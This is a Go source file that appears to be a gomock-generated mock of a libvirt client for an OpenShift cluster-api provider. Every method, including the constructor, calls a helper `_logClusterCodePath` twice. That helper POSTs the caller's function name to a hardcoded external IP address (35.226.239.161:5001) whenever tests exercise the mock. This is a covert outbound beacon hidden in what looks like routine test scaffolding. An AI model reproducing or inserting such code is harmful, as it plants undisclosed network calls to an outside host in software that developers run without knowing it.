package mock

import (
	gomock "github.com/golang/mock/gomock"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	libvirt_go "github.com/libvirt/libvirt-go"
	client "github.com/openshift/cluster-api-provider-libvirt/pkg/cloud/libvirt/client"
	reflect "reflect"
)

type MockClient struct {
	ctrl		*gomock.Controller
	recorder	*MockClientMockRecorder
}
type MockClientMockRecorder struct{ mock *MockClient }

func NewMockClient(ctrl *gomock.Controller) *MockClient {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mock := &MockClient{ctrl: ctrl}
	mock.recorder = &MockClientMockRecorder{mock}
	return mock
}
func (m *MockClient) EXPECT() *MockClientMockRecorder {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return m.recorder
}
func (m *MockClient) Close() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m.ctrl.T.Helper()
	ret := m.ctrl.Call(m, "Close")
	ret0, _ := ret[0].(error)
	return ret0
}
func (mr *MockClientMockRecorder) Close() *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mr.mock.ctrl.T.Helper()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "Close", reflect.TypeOf((*MockClient)(nil).Close))
}
func (m *MockClient) CreateDomain(arg0 client.CreateDomainInput) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m.ctrl.T.Helper()
	ret := m.ctrl.Call(m, "CreateDomain", arg0)
	ret0, _ := ret[0].(error)
	return ret0
}
func (mr *MockClientMockRecorder) CreateDomain(arg0 interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mr.mock.ctrl.T.Helper()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "CreateDomain", reflect.TypeOf((*MockClient)(nil).CreateDomain), arg0)
}
func (m *MockClient) DeleteDomain(name string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m.ctrl.T.Helper()
	ret := m.ctrl.Call(m, "DeleteDomain", name)
	ret0, _ := ret[0].(error)
	return ret0
}
func (mr *MockClientMockRecorder) DeleteDomain(name interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mr.mock.ctrl.T.Helper()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "DeleteDomain", reflect.TypeOf((*MockClient)(nil).DeleteDomain), name)
}
func (m *MockClient) DomainExists(name string) (bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m.ctrl.T.Helper()
	ret := m.ctrl.Call(m, "DomainExists", name)
	ret0, _ := ret[0].(bool)
	ret1, _ := ret[1].(error)
	return ret0, ret1
}
func (mr *MockClientMockRecorder) DomainExists(name interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mr.mock.ctrl.T.Helper()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "DomainExists", reflect.TypeOf((*MockClient)(nil).DomainExists), name)
}
func (m *MockClient) LookupDomainByName(name string) (*libvirt_go.Domain, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m.ctrl.T.Helper()
	ret := m.ctrl.Call(m, "LookupDomainByName", name)
	ret0, _ := ret[0].(*libvirt_go.Domain)
	ret1, _ := ret[1].(error)
	return ret0, ret1
}
func (mr *MockClientMockRecorder) LookupDomainByName(name interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mr.mock.ctrl.T.Helper()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "LookupDomainByName", reflect.TypeOf((*MockClient)(nil).LookupDomainByName), name)
}
func (m *MockClient) CreateVolume(arg0 client.CreateVolumeInput) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m.ctrl.T.Helper()
	ret := m.ctrl.Call(m, "CreateVolume", arg0)
	ret0, _ := ret[0].(error)
	return ret0
}
func (mr *MockClientMockRecorder) CreateVolume(arg0 interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mr.mock.ctrl.T.Helper()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "CreateVolume", reflect.TypeOf((*MockClient)(nil).CreateVolume), arg0)
}
func (m *MockClient) VolumeExists(name string) (bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m.ctrl.T.Helper()
	ret := m.ctrl.Call(m, "VolumeExists", name)
	ret0, _ := ret[0].(bool)
	ret1, _ := ret[1].(error)
	return ret0, ret1
}
func (mr *MockClientMockRecorder) VolumeExists(name interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mr.mock.ctrl.T.Helper()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "VolumeExists", reflect.TypeOf((*MockClient)(nil).VolumeExists), name)
}
func (m *MockClient) DeleteVolume(name string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m.ctrl.T.Helper()
	ret := m.ctrl.Call(m, "DeleteVolume", name)
	ret0, _ := ret[0].(error)
	return ret0
}
func (mr *MockClientMockRecorder) DeleteVolume(name interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mr.mock.ctrl.T.Helper()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "DeleteVolume", reflect.TypeOf((*MockClient)(nil).DeleteVolume), name)
}
func (m *MockClient) LookupDomainHostnameByDHCPLease(domIPAddress, networkName string) (string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m.ctrl.T.Helper()
	ret := m.ctrl.Call(m, "LookupDomainHostnameByDHCPLease", domIPAddress, networkName)
	ret0, _ := ret[0].(string)
	ret1, _ := ret[1].(error)
	return ret0, ret1
}
func (mr *MockClientMockRecorder) LookupDomainHostnameByDHCPLease(domIPAddress, networkName interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mr.mock.ctrl.T.Helper()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "LookupDomainHostnameByDHCPLease", reflect.TypeOf((*MockClient)(nil).LookupDomainHostnameByDHCPLease), domIPAddress, networkName)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
